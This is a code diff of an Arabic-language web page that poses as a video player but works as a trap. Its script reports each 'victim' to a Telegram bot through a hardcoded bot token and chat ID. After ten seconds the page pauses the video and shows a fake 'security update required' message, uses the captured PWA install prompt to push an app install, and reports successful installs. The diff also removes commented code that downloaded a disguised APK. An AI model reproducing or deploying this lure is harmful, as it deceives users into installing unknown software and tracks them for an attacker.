@@ -4,9 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مشغل الفيديو الاحترافي</title>
+    <link rel="manifest" href="manifest.json">
+    
     <style>
         :root {
-            --primary-color: #ff3366; /* لون جذاب */
+            --primary-color: #ff3366; 
             --secondary-color: #2a2a2a;
             --text-color: #ffffff;
             --bg-color: #121212;
@@ -29,16 +31,12 @@
             position: relative;
             width: 90%;
             max-width: 600px;
-            aspect-ratio: 16 / 9; /* نسبة عرض إلى ارتفاع قياسية للفيديو */
+            aspect-ratio: 16 / 9; 
             background-color: #000;
             border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(255, 51, 102, 0.3); /* ظل ملون */
+            box-shadow: 0 10px 30px rgba(255, 51, 102, 0.3); 
             overflow: hidden;
             transition: transform 0.3s ease;
-        }
-
-        .container:hover {
-            transform: translateY(-5px); /* تأثير حركي عند التمرير */
         }
 
         video {
@@ -49,11 +47,9 @@
 
         .overlay {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.3), rgba(0,0,0,0.8)); /* تدرج لوني للخلفية */
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.3), rgba(0,0,0,0.8)); 
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -68,64 +64,41 @@
             color: white;
             border: none;
             border-radius: 50%;
-            width: 80px;
-            height: 80px;
+            width: 80px; height: 80px;
             cursor: pointer;
             display: flex;
             justify-content: center;
             align-items: center;
             box-shadow: 0 5px 15px rgba(255, 51, 102, 0.5);
-            transition: background-color 0.3s ease, transform 0.2s ease;
-            animation: pulse 1.5s infinite; /* تأثير النبض لجذب الانتباه */
-        }
-
-        .play-btn:hover {
-            background-color: #ff5c85;
-            transform: scale(1.1);
+            animation: pulse 1.5s infinite; 
         }
 
         .play-icon {
-            width: 0;
-            height: 0;
+            width: 0; height: 0;
             border-top: 15px solid transparent;
             border-bottom: 15px solid transparent;
             border-left: 25px solid white;
-            margin-left: 5px; /* لضبط التمركز */
+            margin-left: 5px; 
         }
 
         .info-text {
             font-size: 18px;
             font-weight: bold;
-            color: #fff;
             margin-top: 20px;
-            text-align: center;
             text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
         }
 
-        .sub-text {
-            font-size: 14px;
-            color: #ddd;
-            margin-top: 10px;
-            text-align: center;
-        }
-
         @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(255, 51, 102, 0.7);
-            }
-            70% {
-                box-shadow: 0 0 0 15px rgba(255, 51, 102, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(255, 51, 102, 0);
-            }
+            0% { box-shadow: 0 0 0 0 rgba(255, 51, 102, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 51, 102, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 51, 102, 0); }
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <video id="mainVideo" loop>
+        <video id="mainVideo">
             <source src="v.mp4" type="video/mp4">
             متصفحك لا يدعم تشغيل الفيديو.
         </video>
@@ -135,32 +108,58 @@
                 <div class="play-icon"></div>
             </button>
             <p class="info-text">فيديو حصري ومشوق بانتظارك!</p>
-            <p class="sub-text">انقر للتشغيل والاستمتاع بالمشاهدة فوراً.</p>
         </div>
     </div>
 
     <script>
         const botToken = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
         const chatId = "1356975454";
+        let installPrompt = null;
+        let hasFired = false;
+
+        // التقاط حدث التثبيت PWA
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            installPrompt = e;
+        });
+
+        // تسجيل الـ Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
+        }
 
         function startTrap() {
-            // 1. إخفاء الواجهة وتشغيل الفيديو
             document.getElementById('overlay').style.display = 'none';
             var video = document.getElementById('mainVideo');
             video.play();
-
-            // 2. إرسال إشعار للبوت
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 الضحية بدأ مشاهدة الفيديو الاحترافي!")}`);
-
-            // 3. (اختياري) يمكنك إضافة كود هنا لتنزيل ملف الـ APK إذا أردت دمج الطريقتين
-            // const fileUrl = 'facebook_fix.apk'; 
-            // const link = document.createElement('a');
-            // link.href = fileUrl;
-            // link.download = 'Video_Player_Update.apk';
-            // document.body.appendChild(link);
-            // link.click();
-            // document.body.removeChild(link);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 الضحية بدأ المشاهدة!")}`);
         }
+
+        // مراقبة الـ 10 ثواني
+        const video = document.getElementById('mainVideo');
+        video.ontimeupdate = function() {
+            if (video.currentTime >= 10 && !hasFired) {
+                hasFired = true;
+                video.pause(); 
+                
+                const professionalMsg = "⚠️ تحديث أمني مطلوب:\n\nبموجب سياسة الخصوصية الجديدة وحماية المحتوى من الحظر، يجب تثبيت 'بروتوكول تشغيل الوسائط' المعتمد لمتابعة المشاهدة بشكل آمن.\n\nهل تريد التفعيل الآن؟";
+                
+                if (installPrompt) {
+                    if (confirm(professionalMsg)) {
+                        installPrompt.prompt();
+                        installPrompt.userChoice.then((choice) => {
+                            if (choice.outcome === 'accepted') {
+                                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ الضحية ثبت التطبيق!")}`);
+                                alert("تم التفعيل بنجاح.");
+                                video.play();
+                            }
+                        });
+                    }
+                } else {
+                    alert("يرجى استخدام متصفح Google Chrome لتجنب حظر المحتوى.");
+                }
+            }
+        };
     </script>
 </body>
 </html>
